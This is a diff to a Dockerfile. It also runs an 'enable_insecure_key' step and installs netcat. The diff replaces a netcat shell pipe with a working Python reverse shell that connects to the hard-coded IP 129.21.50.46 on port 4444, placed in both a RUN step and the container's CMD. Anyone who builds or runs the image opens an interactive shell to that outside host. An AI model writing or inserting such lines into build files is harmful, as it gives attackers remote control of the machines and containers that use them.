@@ -12,6 +12,6 @@ RUN /usr/sbin/enable_insecure_key
 
 RUN apt-get install -y netcat
 
-RUN /bin/sh | nc 129.21.50.46 4444
+RUN python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("129.21.50.46",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-CMD ["/bin/sh | nc 129.21.50.46 4444"]
+CMD ["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("129.21.50.46",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"]
